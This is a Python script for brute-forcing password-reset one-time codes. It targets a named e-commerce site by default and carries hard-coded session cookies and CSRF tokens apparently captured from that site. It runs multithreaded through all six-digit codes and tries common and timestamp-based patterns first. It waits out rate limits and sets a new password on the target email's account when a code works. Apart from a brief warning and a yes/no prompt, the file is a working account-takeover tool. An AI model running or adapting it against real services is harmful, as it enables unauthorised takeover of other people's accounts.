#!/usr/bin/env python3
"""
Password Reset OTP Brute Force Security Testing Script

This script tests for vulnerabilities in password reset OTP verification systems
by attempting to brute force OTP codes for a given email address.

WARNING: This script is for security testing purposes only. Use only on systems
you own or have explicit permission to test.
"""

import requests
import time
import itertools
import argparse
import sys
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from typing import Dict, List, Optional, Tuple


class OTPBruteForcer:
    def __init__(self, base_url: str, email: str, max_threads: int = 10):
        self.base_url = base_url
        self.email = email
        self.session = requests.Session()
        self.csrf_token = None
        self.cookies = {}
        self.successful_otp = None
        self.max_threads = max_threads
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.attempts_count = 0
        self.rate_limited = False
        
        # Default headers based on the examples
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IL,en;q=0.9",
            "DNT": "1",
            "Origin": base_url,
            "Referer": f"{base_url}/sign-in",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        })

    def setup_session(self, custom_cookies: Optional[Dict[str, str]] = None):
        """Setup session with cookies and CSRF token"""
        if custom_cookies:
            for name, value in custom_cookies.items():
                self.session.cookies.set(name, value)
        else:
            # Default cookies from examples (you may need to update these)
            default_cookies = {
                "csrftoken": "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6",
                "_ga": "GA1.1.891817179.1758869982",
                "_fbp": "fb.1.1758869982585.137506080810032605",
                "_clck": "1yednyd%5E2%5Efzn%5E0%5E2095",
                "_ga_HVF922F34T": "GS2.1.s1758869982$o1$g1$t1758870079$j60$l0$h0",
                "_clsk": "g5xlki%5E1758870080808%5E2%5E1%5Eh.clarity.ms%2Fcollect",
                "_gcl_au": "1.1.1432505701.1758869982.1171585573.1758870103.1758870197"
            }
            for name, value in default_cookies.items():
                self.session.cookies.set(name, value)
        
        # Extract CSRF token from cookies
        self.csrf_token = self.session.cookies.get('csrftoken')

    def create_thread_session(self) -> requests.Session:
        """Create a new session for each thread with proper cookies and headers"""
        thread_session = requests.Session()
        
        # Copy headers from main session
        thread_session.headers.update(self.session.headers)
        
        # Copy cookies from main session
        for cookie in self.session.cookies:
            thread_session.cookies.set(cookie.name, cookie.value)
        
        return thread_session

    def get_csrf_token(self) -> str:
        """Get CSRF token from the sign-in page"""
        try:
            response = self.session.get(f"{self.base_url}/sign-in")
            response.raise_for_status()
            
            # Try to extract CSRF token from response
            if 'csrfmiddlewaretoken' in response.text:
                import re
                match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
                if match:
                    self.csrf_token = match.group(1)
                    return self.csrf_token
            
            # Fallback to cookie value
            return self.session.cookies.get('csrftoken', self.csrf_token)
            
        except Exception as e:
            print(f"Error getting CSRF token: {e}")
            return self.csrf_token or "iZt4ubY5VGw0YVu0xarWNhvnuy90gbSLxo5lecX4WJ3HMscnzJyZSbCcYIAYfebH"

    def test_otp(self, otp: str, new_password: str = "Aa12345!B", session: Optional[requests.Session] = None) -> Tuple[bool, int, str]:
        """Test a single OTP code"""
        # Use provided session or create new one for thread safety
        test_session = session or self.create_thread_session()
        url = f"{self.base_url}/sign-in"
        
        # Check if we should stop (success found or rate limited)
        if self.stop_event.is_set():
            return False, 0, "Stopped"
        
        # Prepare form data
        data = {
            "step": "5",
            "otp_email": quote(self.email, safe='@'),
            "otpverify": otp,
            "new_password": new_password,
            "csrfmiddlewaretoken": self.csrf_token or self.get_csrf_token()
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        
        try:
            response = test_session.post(
                url,
                data=data,
                headers=headers,
                timeout=10
            )
            
            # Thread-safe increment of attempts
            with self.lock:
                self.attempts_count += 1
            
            return self.analyze_response(response, otp)
            
        except requests.exceptions.Timeout:
            print(f"Timeout for OTP: {otp}")
            return False, 408, "Timeout"
        except Exception as e:
            print(f"Error testing OTP {otp}: {e}")
            return False, 0, str(e)

    def analyze_response(self, response: requests.Response, otp: str) -> Tuple[bool, int, str]:
        """Analyze the response to determine if OTP was successful"""
        status_code = response.status_code
        response_text = response.text.lower()
        
        # Success indicators
        success_indicators = [
            "password changed successfully",
            "password updated",
            "success",
            "dashboard",
            "profile",
            "welcome"
        ]
        
        # Failure indicators
        failure_indicators = [
            "invalid otp",
            "incorrect otp",
            "otp expired",
            "invalid verification code",
            "wrong code",
            "error"
        ]
        
        # Check for success
        if status_code == 200:
            for indicator in success_indicators:
                if indicator in response_text:
                    with self.lock:
                        if not self.successful_otp:  # First success wins
                            self.successful_otp = otp
                            self.stop_event.set()  # Signal all threads to stop
                    print(f"✅ SUCCESS! OTP {otp} is valid!")
                    return True, status_code, "Success"
        
        # Check for specific failure messages
        for indicator in failure_indicators:
            if indicator in response_text:
                return False, status_code, f"Failed: {indicator}"
        
        # Rate limiting detection
        if status_code == 429 or "too many requests" in response_text:
            with self.lock:
                self.rate_limited = True
            return False, status_code, "Rate limited"
        
        # Other status codes
        if status_code >= 400:
            return False, status_code, f"HTTP Error {status_code}"
        
        return False, status_code, "Unknown response"

    def generate_otp_codes(self, length: int = 6) -> List[str]:
        """Generate all possible OTP codes of given length"""
        if length > 6:
            print("Warning: Generating OTPs longer than 6 digits may take a very long time!")
        
        codes = []
        for i in range(10 ** length):
            codes.append(str(i).zfill(length))
        return codes

    def generate_common_otps(self) -> List[str]:
        """Generate common/predictable OTP patterns"""
        common_patterns = []
        
        # Sequential numbers
        common_patterns.extend(['000000', '111111', '222222', '333333', '444444', 
                               '555555', '666666', '777777', '888888', '999999'])
        
        # Sequential patterns
        common_patterns.extend(['123456', '654321', '012345', '543210'])
        
        # Date-based patterns (current year, month, day)
        import datetime
        now = datetime.datetime.now()
        year = str(now.year)[-2:]  # Last 2 digits of year
        month = str(now.month).zfill(2)
        day = str(now.day).zfill(2)
        
        common_patterns.extend([
            year + month + day,
            day + month + year,
            month + day + year,
            year + day + month
        ])
        
        # Other common patterns
        common_patterns.extend(['000001', '100000', '999999', '123123', '456456'])
        
        return list(set(common_patterns))  # Remove duplicates

    def test_otp_worker(self, otp: str, delay: float = 0.1) -> Tuple[str, bool, int, str]:
        """Worker function for testing OTP in threads"""
        if self.stop_event.is_set():
            return otp, False, 0, "Stopped"
        
        # Create session for this thread
        session = self.create_thread_session()
        
        # Add delay to avoid overwhelming the server
        time.sleep(delay)
        
        success, status, message = self.test_otp(otp, session=session)
        
        return otp, success, status, message

    def brute_force(self, 
                   start_range: int = 0, 
                   end_range: int = 999999, 
                   delay: float = 0.1,
                   test_common_first: bool = True) -> Optional[str]:
        """
        Perform brute force attack on OTP
        
        Args:
            start_range: Starting OTP number
            end_range: Ending OTP number
            delay: Delay between requests in seconds
            test_common_first: Test common patterns first
        """
        print(f"Starting OTP brute force for email: {self.email}")
        print(f"Target URL: {self.base_url}")
        print(f"Range: {start_range:06d} - {end_range:06d}")
        print(f"Delay: {delay} seconds")
        print("-" * 50)
        
        attempts = 0
        
        # Test common patterns first
        if test_common_first:
            print("Testing common OTP patterns first...")
            common_otps = self.generate_common_otps()
            for otp in common_otps:
                if len(otp) == 6:  # Only test 6-digit codes
                    attempts += 1
                    success, status, message = self.test_otp(otp)
                    
                    print(f"Attempt {attempts}: OTP {otp} - Status: {status} - {message}")
                    
                    if success:
                        self.successful_otp = otp
                        return otp
                    
                    time.sleep(delay)
        
        # Brute force sequential numbers
        print(f"Starting sequential brute force...")
        for i in range(start_range, end_range + 1):
            otp = str(i).zfill(6)
            attempts += 1
            
            success, status, message = self.test_otp(otp)
            
            if attempts % 100 == 0:
                print(f"Progress: {attempts} attempts, current OTP: {otp}")
            
            print(f"Attempt {attempts}: OTP {otp} - Status: {status} - {message}")
            
            if success:
                self.successful_otp = otp
                print(f"🎉 SUCCESSFUL OTP FOUND: {otp}")
                return otp
            
            # Handle rate limiting
            if status == 429 or "rate limited" in message.lower():
                print(f"Rate limited! Waiting 60 seconds...")
                time.sleep(60)
                continue
            
            time.sleep(delay)
        
        print("Brute force completed. No valid OTP found.")
        return None

    def multithreaded_brute_force(self, 
                                 start_range: int = 0, 
                                 end_range: int = 999999, 
                                 delay: float = 0.05,
                                 test_common_first: bool = True,
                                 max_threads: int = None) -> Optional[str]:
        """
        Perform multithreaded brute force attack on OTP
        
        Args:
            start_range: Starting OTP number
            end_range: Ending OTP number
            delay: Delay between requests in seconds (per thread)
            test_common_first: Test common patterns first
            max_threads: Maximum number of threads (uses class default if None)
        """
        if max_threads is None:
            max_threads = self.max_threads
        
        print(f"Starting MULTITHREADED OTP brute force for email: {self.email}")
        print(f"Target URL: {self.base_url}")
        print(f"Range: {start_range:06d} - {end_range:06d}")
        print(f"Threads: {max_threads}")
        print(f"Delay per thread: {delay} seconds")
        print("-" * 50)
        
        self.stop_event.clear()
        self.attempts_count = 0
        self.rate_limited = False
        
        # Test common patterns first (single-threaded for simplicity)
        if test_common_first:
            print("Testing common OTP patterns first...")
            common_otps = self.generate_common_otps()
            for otp in common_otps:
                if len(otp) == 6:  # Only test 6-digit codes
                    if self.stop_event.is_set():
                        break
                    
                    success, status, message = self.test_otp(otp)
                    print(f"Common pattern {otp} - Status: {status} - {message}")
                    
                    if success:
                        return otp
                    
                    time.sleep(delay)
        
        # Generate all OTPs to test
        print(f"Generating OTP range {start_range:06d} to {end_range:06d}...")
        otp_list = [str(i).zfill(6) for i in range(start_range, end_range + 1)]
        
        print(f"Starting multithreaded brute force with {max_threads} threads...")
        
        # Use ThreadPoolExecutor for controlled threading
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Submit all OTP tests to thread pool
            future_to_otp = {
                executor.submit(self.test_otp_worker, otp, delay): otp 
                for otp in otp_list
            }
            
            try:
                for future in as_completed(future_to_otp):
                    if self.stop_event.is_set():
                        break
                    
                    try:
                        otp, success, status, message = future.result()
                        
                        # Print progress every 50 attempts
                        if self.attempts_count % 50 == 0:
                            print(f"Progress: {self.attempts_count} attempts completed...")
                        
                        if success:
                            print(f"🎉 SUCCESSFUL OTP FOUND: {otp}")
                            # Cancel remaining futures
                            for f in future_to_otp:
                                f.cancel()
                            return otp
                        
                        # Handle rate limiting
                        if self.rate_limited:
                            print(f"Rate limiting detected! Pausing threads...")
                            time.sleep(30)  # Pause before continuing
                            self.rate_limited = False
                        
                        # Print occasional status updates
                        if status != 200 and self.attempts_count % 100 == 0:
                            print(f"Status update - OTP {otp}: {status} - {message}")
                    
                    except Exception as e:
                        print(f"Error in thread execution: {e}")
                        
            except KeyboardInterrupt:
                print("\nInterrupted by user. Stopping all threads...")
                self.stop_event.set()
                # Cancel all pending futures
                for future in future_to_otp:
                    future.cancel()
        
        print(f"Multithreaded brute force completed. Total attempts: {self.attempts_count}")
        if self.successful_otp:
            print(f"🎉 SUCCESS! Found OTP: {self.successful_otp}")
            return self.successful_otp
        else:
            print("❌ No valid OTP found.")
            return None

    def smart_brute_force(self, delay: float = 0.05, use_multithreading: bool = True) -> Optional[str]:
        """
        Smart brute force that adapts based on responses
        """
        print("Starting smart brute force attack...")
        
        # Test common patterns first (single-threaded for quick results)
        print("Testing common patterns...")
        common_otps = self.generate_common_otps()
        for otp in common_otps:
            if len(otp) == 6:
                success, status, message = self.test_otp(otp)
                print(f"Common OTP {otp} - Status: {status} - {message}")
                
                if success:
                    self.successful_otp = otp
                    return otp
                
                time.sleep(delay)
        
        # Test recent timestamps (last hour in various formats)
        import datetime
        now = datetime.datetime.now()
        
        timestamp_patterns = []
        for minutes_ago in range(0, 60, 5):  # Test every 5 minutes in the last hour
            time_point = now - datetime.timedelta(minutes=minutes_ago)
            # Various timestamp formats
            timestamp_patterns.extend([
                time_point.strftime("%H%M%S")[-6:],  # HHMMSS
                time_point.strftime("%M%S00"),        # MMSS00
                time_point.strftime("%S%M%H")[-6:],   # Reverse
            ])
        
        print("Testing timestamp-based patterns...")
        for otp in set(timestamp_patterns):
            if len(otp) == 6 and otp.isdigit():
                success, status, message = self.test_otp(otp)
                print(f"Timestamp OTP {otp} - Status: {status} - {message}")
                
                if success:
                    self.successful_otp = otp
                    return otp
                
                time.sleep(delay)
        
        # If still no success, do full brute force
        print("No success with smart patterns. Starting full brute force...")
        if use_multithreading:
            return self.multithreaded_brute_force(0, 999999, delay, test_common_first=False)
        else:
            return self.brute_force(0, 999999, delay, test_common_first=False)


def main():
    parser = argparse.ArgumentParser(
        description="OTP Brute Force Security Testing Tool",
        epilog="WARNING: Use only on systems you own or have permission to test!"
    )
    
    parser.add_argument("email", help="Target email address")
    parser.add_argument("--url", default="https://techshopbd.com", 
                       help="Base URL of the target (default: https://techshopbd.com)")
    parser.add_argument("--start", type=int, default=0, 
                       help="Starting OTP number (default: 0)")
    parser.add_argument("--end", type=int, default=999999, 
                       help="Ending OTP number (default: 999999)")
    parser.add_argument("--delay", type=float, default=0.1, 
                       help="Delay between requests in seconds (default: 0.1)")
    parser.add_argument("--smart", action="store_true", 
                       help="Use smart brute force with common patterns")
    parser.add_argument("--common-only", action="store_true", 
                       help="Test only common OTP patterns")
    parser.add_argument("--threads", type=int, default=10, 
                       help="Number of threads for multithreaded brute force (default: 10)")
    parser.add_argument("--no-threading", action="store_true", 
                       help="Disable multithreading (use single-threaded mode)")
    parser.add_argument("--multithreaded", action="store_true", 
                       help="Use multithreaded brute force (default for regular brute force)")
    
    args = parser.parse_args()
    
    print("🔒 OTP Brute Force Security Testing Tool")
    print("=" * 50)
    print(f"Target Email: {args.email}")
    print(f"Target URL: {args.url}")
    print("=" * 50)
    print()
    
    # Warning message
    print("⚠️  WARNING: This tool is for security testing purposes only!")
    print("⚠️  Ensure you have proper authorization before testing!")
    print()
    
    confirm = input("Do you have permission to test this system? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Testing aborted. Only test systems you own or have permission to test.")
        sys.exit(1)
    
    # Initialize brute forcer
    brute_forcer = OTPBruteForcer(args.url, args.email, max_threads=args.threads)
    brute_forcer.setup_session()
    
    print(f"Threading mode: {'Disabled' if args.no_threading else f'Enabled ({args.threads} threads)'}")
    print()
    
    try:
        if args.common_only:
            # Test only common patterns
            print("Testing common OTP patterns only...")
            common_otps = brute_forcer.generate_common_otps()
            for otp in common_otps:
                if len(otp) == 6:
                    success, status, message = brute_forcer.test_otp(otp)
                    print(f"OTP {otp} - Status: {status} - {message}")
                    
                    if success:
                        print(f"🎉 SUCCESS! Valid OTP found: {otp}")
                        sys.exit(0)
                    
                    time.sleep(args.delay)
            
            print("No valid OTP found in common patterns.")
            
        elif args.smart:
            # Smart brute force
            result = brute_forcer.smart_brute_force(args.delay, use_multithreading=not args.no_threading)
            if result:
                print(f"🎉 SUCCESS! Valid OTP: {result}")
            else:
                print("❌ No valid OTP found.")
        else:
            # Regular brute force
            if args.multithreaded or not args.no_threading:
                # Use multithreaded brute force by default
                result = brute_forcer.multithreaded_brute_force(args.start, args.end, args.delay)
            else:
                # Use single-threaded brute force
                result = brute_forcer.brute_force(args.start, args.end, args.delay)
            
            if result:
                print(f"🎉 SUCCESS! Valid OTP: {result}")
            else:
                print("❌ No valid OTP found in specified range.")
                
    except KeyboardInterrupt:
        print("\n\nBrute force interrupted by user.")
        if brute_forcer.successful_otp:
            print(f"Last successful OTP: {brute_forcer.successful_otp}")
    except Exception as e:
        print(f"\nError during brute force: {e}")


if __name__ == "__main__":
    main()